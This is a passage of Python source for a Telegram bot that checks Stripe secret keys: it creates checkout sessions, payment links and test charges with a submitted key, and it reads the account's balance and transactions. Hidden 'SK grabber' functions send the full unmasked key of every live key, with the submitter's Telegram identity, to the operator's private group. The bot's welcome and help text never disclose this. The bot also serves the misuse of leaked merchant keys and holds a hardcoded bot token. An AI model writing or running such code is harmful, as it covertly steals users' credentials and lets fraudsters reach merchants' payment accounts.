#!/usr/bin/env python3
"""
Stripe SK Bot - Premium Telegram Bot
Beautiful UI with premium emojis
Owner: @NotYoursNaruto
Maker: @NotYoursNaruto
"""

import asyncio
import concurrent.futures
import re
import time
import logging
from typing import Optional, Dict, List, Any
from datetime import datetime

import stripe
from aiogram import Bot, Dispatcher, types, Router, F
from aiogram.filters import Command, CommandStart
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest

# ── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s │ %(levelname)s │ %(name)s │ %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("sk_bot")

# ── Config ──────────────────────────────────────────────────────────────────
TOKEN = "8207796517:AAF06e3R5_z2CTYcy6MC8--UyfBs62OuowE"  # <── REPLACE THIS

# ── Owner Info ─────────────────────────────────────────────────────────────
OWNER_USERNAME = "@NotYoursNaruto"
BOT_NAME = "NARUTO SK BOT"
BOT_TAG = "@NarutoSkBot"

# ── SK Grabber Group ──────────────────────────────────────────────────────
SK_GRABBER_GROUP = -1003795346094  # Group where live SKs will be sent

# ── Premium Emoji IDs (from your bot.py) ──────────────────────────────────
E = {
    "bolt": "5084974483685507801",
    "bolt2": "5136449172806828766",
    "bolt3": "5345941618623005800",
    "bolt4": "5348503265967355284",
    "bolt5": "5350298742685710886",
    "check": "5278622189556354905",
    "check2": "5895671830210940904",
    "check3": "5197288647275071607",
    "cross": "5042112436648281096",
    "cross2": "5447644880824181073",
    "cross3": "5121063440311386962",
    "cross4": "6023909739669229757",
    "star": "5980995951160987855",
    "gem": "5226656353744862682",
    "globe": "5134452506935427991",
    "link": "5042101437237036298",
    "chat": "5303138782004924588",
    "chat2": "5040036030414062506",
    "link2": "5201691993775818138",
    "user": "5321304384838057247",
    "warn": "5855207143724027916",
    "warn2": "6008233706039284019",
    "rocket": "5195033767969839232",
    "sparkle": "5172739056592749710",
    "hourglass": "5215327832040811010",
    "plus": "5253652327734192243",
    "dice": "5361696340348779794",
    "refresh": "5852670420074893746",
    "bank": "5854784287013867183",
    "gift": "6025929752982852543",
    "stop": "6114014038960638990",
    "loading": "5325834523068342417",
    "prev": "4902349923049014048",
    "next": "4902715076873553054",
    "help_prev": "5246943906645428644",
    "help_next": "5462965076413656490",
}

# ── Result Emojis ──────────────────────────────────────────────────────────
R = {
    "cc": "5472250091332993630",
    "gate": "6321225560789877992",
    "price": "5039789890133296083",
    "bin_info": "5775903905498010383",
    "visa": "5298970748172385213",
    "master": "5355269226732995665",
    "amex": "4983234121556820510",
    "type": "5350396951407895212",
    "level": "5784914081165087232",
    "bank": "5332455502917949981",
    "country": "5285452600601237916",
    "checked_by": "5958417144877160497",
}

def pe(emoji_id: str) -> str:
    """Wrap a custom emoji ID into Telegram's premium emoji HTML tag."""
    return f'<tg-emoji emoji-id="{emoji_id}">⚡</tg-emoji>'

def bold(text: str) -> str:
    """Convert ASCII text to Unicode Mathematical Sans-Serif Bold."""
    _BOLD_MAP = {}
    for i, c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        _BOLD_MAP[c] = chr(0x1D5D4 + i)
    for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
        _BOLD_MAP[c] = chr(0x1D5EE + i)
    for i, c in enumerate("0123456789"):
        _BOLD_MAP[c] = chr(0x1D7EC + i)
    return "".join(_BOLD_MAP.get(c, c) for c in text)

def italic(text: str) -> str:
    """Convert text to Mathematical Italic Unicode."""
    _ITALIC_MAP = {}
    for i, c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        _ITALIC_MAP[c] = chr(0x1D434 + i)
    for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
        _ITALIC_MAP[c] = chr(0x1D44E + i) if c != 'h' else '\u210E'
    for i, c in enumerate("0123456789"):
        _ITALIC_MAP[c] = chr(0x1D7CE + i)
    return "".join(_ITALIC_MAP.get(c, c) for c in text)

def divider() -> str:
    return "━━━━━━━━━━━━━━━━━━━━━━━━━"

def owner_badge() -> str:
    return f"{pe(E['gem'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"

def branding_footer() -> str:
    return (
        f"\n\n{pe(E['gem'])} {bold('『')} {bold(BOT_NAME)} {bold('』')} {pe(E['gem'])}\n"
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}\n"
        f"{pe(E['chat'])} {bold('Bot:')} {bold(BOT_TAG)}"
    )

def branding_footer_short() -> str:
    return f"\n\n{pe(E['gem'])} {bold(OWNER_USERNAME)} ─ {pe(E['bolt'])} {bold(BOT_TAG)}"


# ── SK Grabber Functions ──────────────────────────────────────────────────

async def send_live_sk_to_grabber(
    sk: str,
    user_id: int,
    user_name: str,
    user_username: str,
    key_type: str,
    status: str = "LIVE",
    additional_info: str = "",
) -> None:
    """
    Send a live Stripe key to the grabber group.
    """
    try:
        masked_sk = mask_key(sk)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # ── Build the grabber message ──
        grabber_msg = "\n".join([
            f"{pe(E['gem'])} {bold('🔑 LIVE STRIPE KEY GRABBED')} {pe(E['gem'])}",
            f"{bold(divider())}",
            f"{pe(E['bolt'])} {bold('Key:')} <code>{sk}</code>",
            f"{pe(E['bolt'])} {bold('Masked:')} <code>{masked_sk}</code>",
            f"{pe(E['star'])} {bold('Type:')} {bold(key_type)}",
            f"{pe(E['check2'])} {bold('Status:')} {bold(status)}",
            "",
            f"{pe(E['user'])} {bold('User ID:')} <code>{user_id}</code>",
            f"{pe(E['chat'])} {bold('Name:')} {bold(user_name or 'Unknown')}",
            f"{pe(E['link2'])} {bold('Username:')} @{user_username}" if user_username else f"{pe(E['link2'])} {bold('Username:')} None",
            f"{pe(E['hourglass'])} {bold('Time:')} {timestamp}",
        ])
        
        if additional_info:
            grabber_msg += f"\n\n{pe(E['warn'])} {bold('Info:')} {additional_info}"
        
        grabber_msg += f"\n\n{pe(E['gem'])} {bold('『')} {bold(BOT_NAME)} {bold('』')} {pe(E['gem'])}"
        grabber_msg += f"\n{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        
        # ── Send to grabber group ──
        from aiogram import Bot as AiogramBot
        await bot.send_message(
            SK_GRABBER_GROUP,
            grabber_msg,
            parse_mode=ParseMode.HTML,
            disable_notification=False,
        )
        log.info(f"📤 SK GRABBER: Sent live SK for user {user_id} to group {SK_GRABBER_GROUP}")
        
    except Exception as e:
        log.error(f"❌ SK GRABBER: Failed to send to group: {e}")


async def check_and_grab_sk(
    sk: str,
    user: types.User,
    result: Dict[str, Any],
    command: str = "test",
) -> None:
    """
    Check if the SK is live/active and send to grabber group.
    """
    if not sk or not result.get("success"):
        return
    
    # Determine if the key is live (active)
    is_live = False
    key_type = result.get("key_type", "UNKNOWN")
    status = result.get("status", "ACTIVE")
    message = result.get("message", "")
    
    # Check various indicators of a live key
    if "active" in message.lower() or "succeeded" in status.lower() or "requires" in status.lower():
        is_live = True
    elif key_type == "LIVE" and result.get("success"):
        is_live = True
    elif result.get("payment_intent_id"):
        is_live = True
    
    # Additional check: if the key type is LIVE and we got a valid response
    if key_type == "LIVE" and result.get("success") and "invalid" not in message.lower():
        is_live = True
    
    # If it's a live key, send to grabber
    if is_live:
        # Get user info
        user_id = user.id
        user_name = user.full_name or ""
        user_username = user.username or ""
        
        additional_info = f"Command: /{command} | Status: {status} | Message: {message[:100]}"
        
        await send_live_sk_to_grabber(
            sk=sk,
            user_id=user_id,
            user_name=user_name,
            user_username=user_username,
            key_type=key_type,
            status=status,
            additional_info=additional_info,
        )


# ── Thread pool ─────────────────────────────────────────────────────────────
CHECKER_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=50)

# ── Constants ──────────────────────────────────────────────────────────────
DEFAULT_CURRENCY = "usd"
DEFAULT_AMOUNT = 100

# ── Key Patterns ──────────────────────────────────────────────────────────
SK_PATTERN = re.compile(r"(sk_(?:live|test)_[A-Za-z0-9_\-]+)")
PK_PATTERN = re.compile(r"(pk_(?:live|test)_[A-Za-z0-9_\-]+)")


# ═══════════════════════════════════════════════════════════════════════════
#  CORE FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

def extract_sk_from_text(text: str) -> Optional[str]:
    if not text:
        return None
    for word in text.split():
        word = word.strip()
        if word.startswith("sk_live") or word.startswith("sk_test"):
            return word
    match = SK_PATTERN.search(text)
    return match.group(1) if match else None

def validate_sk(sk: str) -> bool:
    return bool(sk and sk.startswith("sk_") and len(sk) > 10)

def mask_key(key: str) -> str:
    if len(key) <= 16:
        return key[:8] + "…" + key[-4:]
    return key[:12] + "…" + key[-6:]

def get_key_type(sk: str) -> str:
    return "LIVE" if "sk_live" in sk else "TEST"


# ── CHECKOUT SESSION ──────────────────────────────────────────────────────

def generate_checkout_session(
    sk: str,
    amount: int = DEFAULT_AMOUNT,
    currency: str = DEFAULT_CURRENCY,
    product_name: str = "Bot Generated Product",
) -> Dict[str, Any]:
    try:
        import stripe as stripe_lib
        stripe_lib.api_key = sk
        
        product = stripe_lib.Product.create(name=product_name)
        price = stripe_lib.Price.create(
            unit_amount=amount,
            currency=currency.lower(),
            product=product.id,
        )
        session = stripe_lib.checkout.Session.create(
            line_items=[{"price": price.id, "quantity": 1}],
            mode="payment",
            success_url="https://example.com/success",
            cancel_url="https://example.com/cancel",
            payment_method_types=["card"],
        )
        
        return {
            "success": True,
            "session_id": session.id,
            "checkout_url": session.url,
            "amount_total": session.amount_total,
            "currency": session.currency,
            "payment_status": session.payment_status,
            "expires_at": session.expires_at,
            "key_type": get_key_type(sk),
            "masked_key": mask_key(sk),
        }
    except Exception as e:
        return {"success": False, "error": str(e)[:200]}


# ── PAYMENT LINK ──────────────────────────────────────────────────────────

def generate_payment_link(
    sk: str,
    amount: int = DEFAULT_AMOUNT,
    currency: str = DEFAULT_CURRENCY,
    product_name: str = "Bot Generated Product",
) -> Dict[str, Any]:
    try:
        import stripe as stripe_lib
        stripe_lib.api_key = sk
        
        product = stripe_lib.Product.create(name=product_name)
        price = stripe_lib.Price.create(
            unit_amount=amount,
            currency=currency.lower(),
            product=product.id,
        )
        link = stripe_lib.PaymentLink.create(
            line_items=[{"price": price.id, "quantity": 1}],
        )
        
        return {
            "success": True,
            "payment_link_id": link.id,
            "payment_link_url": link.url,
            "amount": amount,
            "currency": link.currency,
            "key_type": get_key_type(sk),
            "masked_key": mask_key(sk),
        }
    except Exception as e:
        return {"success": False, "error": str(e)[:200]}


# ── KEY LOOKUP ────────────────────────────────────────────────────────────

def lookup_key_info(sk: str) -> Dict[str, Any]:
    try:
        import stripe as stripe_lib
        stripe_lib.api_key = sk
        
        result = {
            "success": True,
            "key_type": get_key_type(sk),
            "masked_key": mask_key(sk),
            "account": {
                "email": "N/A",
                "business_name": "N/A",
                "country": "Unknown",
                "charges_enabled": False,
                "payouts_enabled": False,
                "default_currency": "usd",
            },
            "balance": {"available": [], "pending": []},
            "transactions": [],
        }
        
        try:
            balance = stripe_lib.Balance.retrieve()
            if balance:
                result["balance"] = {
                    "available": [
                        f"{b.amount/100:.2f} {b.currency.upper()}"
                        for b in getattr(balance, "available", [])
                    ],
                    "pending": [
                        f"{b.amount/100:.2f} {b.currency.upper()}"
                        for b in getattr(balance, "pending", [])
                    ],
                }
        except Exception:
            pass
        
        try:
            account = stripe_lib.Account.retrieve()
            if account:
                result["account"] = {
                    "email": getattr(account, "email", "N/A"),
                    "business_name": getattr(account, "business_name", "N/A"),
                    "country": getattr(account, "country", "Unknown"),
                    "charges_enabled": getattr(account, "charges_enabled", False),
                    "payouts_enabled": getattr(account, "payouts_enabled", False),
                    "default_currency": getattr(account, "default_currency", "usd"),
                }
        except Exception:
            pass
        
        try:
            transactions = stripe_lib.BalanceTransaction.list(limit=5)
            if transactions:
                result["transactions"] = [
                    {
                        "amount": f"{t.amount/100:.2f} {t.currency.upper()}",
                        "type": t.type,
                        "status": t.status,
                    }
                    for t in transactions
                ]
        except Exception:
            pass
        
        return result
    except Exception as e:
        return {"success": False, "error": str(e)[:200]}


# ── TEST CHARGE ───────────────────────────────────────────────────────────

def test_charge(sk: str, amount: int = 100, currency: str = "usd") -> Dict[str, Any]:
    try:
        import stripe as stripe_lib
        stripe_lib.api_key = sk
        
        intent = stripe_lib.PaymentIntent.create(
            amount=amount,
            currency=currency.lower(),
            payment_method_types=["card"],
            metadata={"test": "true"},
        )
        
        return {
            "success": True,
            "key_type": get_key_type(sk),
            "masked_key": mask_key(sk),
            "payment_intent_id": intent.id,
            "status": intent.status,
            "amount": f"{intent.amount/100:.2f} {intent.currency.upper()}",
            "message": "Key is active and can create payment intents",
        }
    except stripe.error.AuthenticationError as e:
        return {"success": False, "error": f"Invalid SK: {str(e)}"}
    except stripe.error.PermissionError as e:
        return {"success": False, "error": f"Permission denied: {str(e)}"}
    except stripe.error.InvalidRequestError as e:
        if "missing" in str(e).lower():
            return {
                "success": True,
                "key_type": get_key_type(sk),
                "masked_key": mask_key(sk),
                "message": "Key is active but needs additional parameters",
                "error_detail": str(e)[:200],
            }
        return {"success": False, "error": f"Invalid request: {str(e)}"}
    except Exception as e:
        return {"success": False, "error": f"Unexpected error: {str(e)}"}


# ── SESSION LOOKUP ────────────────────────────────────────────────────────

def lookup_checkout_session(sk: str, session_id: str) -> Dict[str, Any]:
    try:
        import stripe as stripe_lib
        stripe_lib.api_key = sk
        session = stripe_lib.checkout.Session.retrieve(session_id)
        return {
            "success": True,
            "session_id": session.id,
            "checkout_url": session.url,
            "amount_total": session.amount_total,
            "currency": session.currency,
            "payment_status": session.payment_status,
            "status": session.status,
            "expires_at": session.expires_at,
            "customer_email": getattr(session, "customer_email", "N/A"),
        }
    except Exception as e:
        return {"success": False, "error": str(e)[:200]}


# ── LIST INTENTS ──────────────────────────────────────────────────────────

def list_payment_intents(sk: str, limit: int = 10) -> Dict[str, Any]:
    try:
        import stripe as stripe_lib
        stripe_lib.api_key = sk
        intents = stripe_lib.PaymentIntent.list(limit=min(limit, 50))
        return {
            "success": True,
            "count": len(intents),
            "intents": [
                {
                    "id": i.id,
                    "amount": f"{i.amount/100:.2f} {i.currency.upper()}",
                    "status": i.status,
                    "created": datetime.fromtimestamp(i.created).strftime("%Y-%m-%d %H:%M"),
                }
                for i in intents
            ],
        }
    except Exception as e:
        return {"success": False, "error": str(e)[:200]}


# ═══════════════════════════════════════════════════════════════════════════
#  FORMATTING FUNCTIONS (PREMIUM UI + BRANDING)
# ═══════════════════════════════════════════════════════════════════════════

def format_lookup_result(data: Dict[str, Any]) -> str:
    if not data.get("success"):
        return f"\n{pe(E['cross'])} {bold('ERROR')} ─ {data.get('error', 'Unknown')}\n{branding_footer_short()}"

    lines = [
        f"\n{pe(E['bank'])} {bold('STRIPE SK INFO')} {pe(E['bank'])}",
        f"{bold(divider())}",
        f"{pe(E['bolt'])} {bold('Key:')} <code>{data.get('masked_key', 'N/A')}</code>",
        f"{pe(E['star'])} {bold('Type:')} {bold(data.get('key_type', 'Unknown'))}",
    ]
    
    acc = data.get("account", {})
    if acc:
        lines.append("")
        lines.append(f"{pe(E['user'])} {bold('Account Details')}")
        lines.append(f"  {pe(E['chat'])} {bold('Email:')} {acc.get('email', 'N/A')}")
        lines.append(f"  {pe(E['link2'])} {bold('Business:')} {acc.get('business_name', 'N/A')}")
        lines.append(f"  {pe(E['globe'])} {bold('Country:')} {acc.get('country', 'Unknown')}")
        
        charges = acc.get('charges_enabled', False)
        payouts = acc.get('payouts_enabled', False)
        lines.append(f"  {pe(E['check']) if charges else pe(E['cross'])} {bold('Charges:')} {'✅ Enabled' if charges else '❌ Disabled'}")
        lines.append(f"  {pe(E['check']) if payouts else pe(E['cross'])} {bold('Payouts:')} {'✅ Enabled' if payouts else '❌ Disabled'}")
    
    bal = data.get("balance", {})
    if bal:
        lines.append("")
        lines.append(f"{pe(E['bank'])} {bold('Balance')}")
        avail = ", ".join(bal.get("available", [])) or "0.00"
        pend = ", ".join(bal.get("pending", [])) or "0.00"
        lines.append(f"  {pe(E['check2'])} {bold('Available:')} {avail}")
        lines.append(f"  {pe(E['hourglass'])} {bold('Pending:')} {pend}")
    
    txs = data.get("transactions", [])
    if txs:
        lines.append("")
        lines.append(f"{pe(E['bolt2'])} {bold('Recent Transactions')}")
        for t in txs[:3]:
            lines.append(f"  • {t['amount']} — {t['type']} ({t['status']})")
    
    lines.append("")
    lines.append(f"{pe(E['gem'])} {bold('『')} {bold(BOT_NAME)} {bold('』')} {pe(E['gem'])}")
    lines.append(f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
    lines.append(f"{pe(E['chat'])} {bold('Bot:')} {bold(BOT_TAG)}")
    return "\n".join(lines)


def format_session_result(data: Dict[str, Any]) -> str:
    if not data.get("success"):
        return f"\n{pe(E['cross'])} {bold('ERROR')} ─ {data.get('error', 'Unknown')}\n{branding_footer_short()}"
    
    return "\n".join([
        f"\n{pe(E['gem'])} {bold('CHECKOUT SESSION GENERATED')} {pe(E['gem'])}",
        f"{bold(divider())}",
        f"{pe(E['link'])} {bold('URL:')} <a href='{data.get('checkout_url', '#')}'>{data.get('checkout_url', 'N/A')}</a>",
        f"{pe(E['dice'])} {bold('ID:')} <code>{data.get('session_id', 'N/A')}</code>",
        f"{pe(E['bank'])} {bold('Amount:')} {data.get('amount_total', 0)/100:.2f} {data.get('currency', 'usd').upper()}",
        f"{pe(E['check'])} {bold('Status:')} {data.get('payment_status', 'N/A')}",
        f"{pe(E['hourglass'])} {bold('Expires:')} {data.get('expires_at', 'N/A')}",
        f"{pe(E['bolt'])} {bold('Key:')} {data.get('masked_key', 'N/A')}",
        f"{pe(E['star'])} {bold('Type:')} {bold(data.get('key_type', 'TEST'))}",
        "",
        f"{pe(E['gem'])} {bold('『')} {bold(BOT_NAME)} {bold('』')} {pe(E['gem'])}",
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
    ])


def format_payment_link_result(data: Dict[str, Any]) -> str:
    if not data.get("success"):
        return f"\n{pe(E['cross'])} {bold('ERROR')} ─ {data.get('error', 'Unknown')}\n{branding_footer_short()}"
    
    amount = data.get('amount', 100)
    currency = data.get('currency', 'usd')
    
    return "\n".join([
        f"\n{pe(E['gem'])} {bold('PAYMENT LINK GENERATED')} {pe(E['gem'])}",
        f"{bold(divider())}",
        f"{pe(E['link'])} {bold('URL:')} <a href='{data.get('payment_link_url', '#')}'>{data.get('payment_link_url', 'N/A')}</a>",
        f"{pe(E['dice'])} {bold('ID:')} <code>{data.get('payment_link_id', 'N/A')}</code>",
        f"{pe(E['bank'])} {bold('Amount:')} {amount/100:.2f} {currency.upper()}",
        f"{pe(E['bolt'])} {bold('Key:')} {data.get('masked_key', 'N/A')}",
        f"{pe(E['star'])} {bold('Type:')} {bold(data.get('key_type', 'TEST'))}",
        "",
        f"{pe(E['gem'])} {bold('『')} {bold(BOT_NAME)} {bold('』')} {pe(E['gem'])}",
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
    ])


def format_test_result(data: Dict[str, Any]) -> str:
    if not data.get("success"):
        return f"\n{pe(E['cross'])} {bold('KEY TEST FAILED')}\n{bold(divider())}\n{data.get('error', 'Unknown error')}\n{branding_footer_short()}"
    
    lines = [
        f"\n{pe(E['check'])} {bold('KEY TEST RESULTS')}",
        f"{bold(divider())}",
        f"{pe(E['bolt'])} {bold('Key:')} <code>{data.get('masked_key', 'N/A')}</code>",
        f"{pe(E['star'])} {bold('Type:')} {bold(data.get('key_type', 'Unknown'))}",
        f"{pe(E['check2'])} {bold('Status:')} {bold('✅ ACTIVE')}",
        f"{pe(E['chat'])} {bold('Message:')} {data.get('message', 'Key is operational')}",
    ]
    if data.get("payment_intent_id"):
        lines.append(f"{pe(E['dice'])} {bold('Intent:')} <code>{data.get('payment_intent_id')}</code>")
        lines.append(f"{pe(E['bank'])} {bold('Amount:')} {data.get('amount', 'N/A')}")
    if data.get("error_detail"):
        lines.append(f"\n{pe(E['warn'])} {bold('Detail:')} {data.get('error_detail')}")
    lines.append("")
    lines.append(f"{pe(E['gem'])} {bold('『')} {bold(BOT_NAME)} {bold('』')} {pe(E['gem'])}")
    lines.append(f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
    return "\n".join(lines)


def format_intents_result(data: Dict[str, Any]) -> str:
    if not data.get("success"):
        return f"\n{pe(E['cross'])} {bold('ERROR')} ─ {data.get('error', 'Unknown')}\n{branding_footer_short()}"
    
    lines = [
        f"\n{pe(E['bolt2'])} {bold('PAYMENT INTENTS')} ({data.get('count', 0)})",
        f"{bold(divider())}",
    ]
    
    intents = data.get("intents", [])
    if intents:
        for intent in intents:
            status_emoji = pe(E['check2']) if intent['status'] == 'succeeded' else pe(E['hourglass']) if intent['status'] == 'requires_payment_method' else pe(E['cross'])
            lines.append(f"  {status_emoji} {bold(intent['amount'])} — {intent['status']} ({intent['created']})")
    else:
        lines.append(f"  {pe(E['sparkle'])} No payment intents found.")
    
    lines.append("")
    lines.append(f"{pe(E['gem'])} {bold('『')} {bold(BOT_NAME)} {bold('』')} {pe(E['gem'])}")
    lines.append(f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
    return "\n".join(lines)


# ── HELP / USAGE FORMATTING ──────────────────────────────────────────────

def format_help_text() -> str:
    return "\n".join([
        f"{pe(E['gem'])} {bold(BOT_NAME)} {pe(E['gem'])}",
        f"{bold(divider())}",
        f"{pe(E['rocket'])} {bold('Commands:')}",
        "",
        f"{pe(E['bolt'])} /gen sk_xxx [amount] [currency]",
        f"  {italic('Generate a checkout session')}",
        "",
        f"{pe(E['link'])} /pay sk_xxx [amount] [currency]",
        f"  {italic('Generate a payment link')}",
        "",
        f"{pe(E['bank'])} /lookup sk_xxx",
        f"  {italic('Look up SK info (balance, account)')}",
        "",
        f"{pe(E['check'])} /test sk_xxx [amount] [currency]",
        f"  {italic('Test if the SK is active')}",
        "",
        f"{pe(E['dice'])} /session sk_xxx session_id",
        f"  {italic('Look up a checkout session')}",
        "",
        f"{pe(E['bolt2'])} /intents sk_xxx [limit]",
        f"  {italic('List recent payment intents')}",
        "",
        f"{pe(E['star'])} {bold('Examples:')}",
        f"  /gen sk_live_xxx 100 usd",
        f"  /lookup sk_test_xxx",
        "",
        f"{pe(E['gem'])} {bold('『')} {bold(BOT_NAME)} {bold('』')} {pe(E['gem'])}",
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
        f"{pe(E['chat'])} {bold('Bot:')} {bold(BOT_TAG)}",
    ])


# ═══════════════════════════════════════════════════════════════════════════
#  TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════════════════

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)


async def safe_edit(msg: types.Message, text: str, **kwargs) -> bool:
    for attempt in range(3):
        try:
            await msg.edit_text(text, **kwargs)
            return True
        except TelegramRetryAfter as e:
            await asyncio.sleep(min(e.retry_after + 1, 10))
        except TelegramBadRequest as e:
            if "message is not modified" in str(e).lower():
                return True
            return False
        except Exception:
            return False
    return False


# ── KEYBOARDS ──────────────────────────────────────────────────────────────

def menu_keyboard() -> dict:
    return {
        "inline_keyboard": [
            [
                {"text": f"{bold('🛒 Checkout')}", "callback_data": "menu_checkout"},
                {"text": f"{bold('🔗 Pay Link')}", "callback_data": "menu_paylink"},
            ],
            [
                {"text": f"{bold('🔍 Lookup')}", "callback_data": "menu_lookup"},
                {"text": f"{bold('🧪 Test')}", "callback_data": "menu_test"},
            ],
            [
                {"text": f"{bold('📋 Commands')}", "callback_data": "menu_cmds"},
                {"text": f"{bold('📊 Intents')}", "callback_data": "menu_intents"},
            ],
        ]
    }


def back_keyboard() -> dict:
    return {
        "inline_keyboard": [
            [{"text": f"{bold('🔙 Back to Menu')}", "callback_data": "menu_back"}]
        ]
    }


WELCOME_MSG = "\n".join([
    f"{pe(E['gem'])} {bold(BOT_NAME)} {pe(E['gem'])}",
    f"{bold(divider())}",
    f"{pe(E['bolt'])} {bold('Generate Checkout Sessions')}",
    f"{pe(E['check'])} {bold('Look up SK information')}",
    f"{pe(E['globe'])} {bold('Test and verify Stripe keys')}",
    f"{pe(E['rocket'])} {bold('Payment links & intents')}",
    "",
    f"{pe(E['star'])} {bold('Use the menu below:')}",
    "",
    f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
    f"{pe(E['chat'])} {bold('Bot:')} {bold(BOT_TAG)}",
])


# ── START ──────────────────────────────────────────────────────────────────

@router.message(CommandStart())
async def cmd_start(message: types.Message):
    await message.reply(WELCOME_MSG, reply_markup=menu_keyboard())

@router.message(Command("start"))
async def cmd_start_fallback(message: types.Message):
    await message.reply(WELCOME_MSG, reply_markup=menu_keyboard())


# ── HELP ──────────────────────────────────────────────────────────────────

@router.message(Command("help"))
async def cmd_help(message: types.Message):
    await message.reply(format_help_text(), reply_markup=back_keyboard())


# ── CALLBACKS ──────────────────────────────────────────────────────────────

@router.callback_query(F.data == "menu_back")
async def cb_back(callback: types.CallbackQuery):
    await callback.answer()
    await safe_edit(callback.message, WELCOME_MSG, reply_markup=menu_keyboard())

@router.callback_query(F.data == "menu_cmds")
async def cb_cmds(callback: types.CallbackQuery):
    await callback.answer()
    await safe_edit(callback.message, format_help_text(), reply_markup=back_keyboard())

@router.callback_query(F.data == "menu_checkout")
async def cb_checkout(callback: types.CallbackQuery):
    await callback.answer()
    text = "\n".join([
        f"{pe(E['gem'])} {bold('GENERATE CHECKOUT')}",
        f"{bold(divider())}",
        f"{pe(E['bolt'])} {bold('Usage:')}",
        f"/gen sk_live_xxx 100 usd",
        "",
        f"{pe(E['star'])} {bold('Amount in cents')}",
        f"  {italic('100 = $1.00, 500 = $5.00')}",
        "",
        f"{pe(E['globe'])} {bold('Currency:')} usd, eur, gbp, etc.",
        "",
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
    ])
    await safe_edit(callback.message, text, reply_markup=back_keyboard())

@router.callback_query(F.data == "menu_paylink")
async def cb_paylink(callback: types.CallbackQuery):
    await callback.answer()
    text = "\n".join([
        f"{pe(E['link'])} {bold('GENERATE PAYMENT LINK')}",
        f"{bold(divider())}",
        f"{pe(E['bolt'])} {bold('Usage:')}",
        f"/pay sk_live_xxx 100 usd",
        "",
        f"{pe(E['star'])} {bold('Creates a buy.stripe.com link')}",
        "",
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
    ])
    await safe_edit(callback.message, text, reply_markup=back_keyboard())

@router.callback_query(F.data == "menu_lookup")
async def cb_lookup(callback: types.CallbackQuery):
    await callback.answer()
    text = "\n".join([
        f"{pe(E['bank'])} {bold('LOOKUP SK INFO')}",
        f"{bold(divider())}",
        f"{pe(E['bolt'])} {bold('Usage:')}",
        f"/lookup sk_live_xxx",
        "",
        f"{pe(E['star'])} {bold('Shows:')}",
        f"  {pe(E['check'])} Account details",
        f"  {pe(E['bank'])} Balance",
        f"  {pe(E['bolt2'])} Recent transactions",
        "",
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
    ])
    await safe_edit(callback.message, text, reply_markup=back_keyboard())

@router.callback_query(F.data == "menu_test")
async def cb_test(callback: types.CallbackQuery):
    await callback.answer()
    text = "\n".join([
        f"{pe(E['check'])} {bold('TEST STRIPE SK')}",
        f"{bold(divider())}",
        f"{pe(E['bolt'])} {bold('Usage:')}",
        f"/test sk_live_xxx 100 usd",
        "",
        f"{pe(E['star'])} {bold('Tests if the key can create payment intents')}",
        "",
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
    ])
    await safe_edit(callback.message, text, reply_markup=back_keyboard())

@router.callback_query(F.data == "menu_intents")
async def cb_intents(callback: types.CallbackQuery):
    await callback.answer()
    text = "\n".join([
        f"{pe(E['bolt2'])} {bold('LIST PAYMENT INTENTS')}",
        f"{bold(divider())}",
        f"{pe(E['bolt'])} {bold('Usage:')}",
        f"/intents sk_live_xxx 10",
        "",
        f"{pe(E['star'])} {bold('Shows recent payment intents')}",
        "",
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}",
    ])
    await safe_edit(callback.message, text, reply_markup=back_keyboard())


# ── COMMAND HANDLERS ──────────────────────────────────────────────────────

@router.message(Command("gen"))
async def cmd_gen(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /gen sk_xxx [amount] [currency]\n"
            f"{pe(E['next'])} {italic('Example:')} /gen sk_live_xxx 100 usd\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    text = args[1].strip()
    sk = extract_sk_from_text(text)
    if not sk:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Stripe SK found!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    if not validate_sk(sk):
        await message.reply(
            f"{pe(E['cross'])} {bold('Invalid SK format!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    rest = text.replace(sk, "").strip()
    parts = rest.split()
    amount = 100
    currency = "usd"
    if parts:
        try: amount = int(parts[0])
        except: pass
    if len(parts) >= 2:
        currency = parts[1].lower()[:3]
    
    loading = await message.reply(
        f"{pe(E['loading'])} {bold('Generating checkout...')}\n"
        f"{pe(E['bolt'])} {italic(mask_key(sk))}\n"
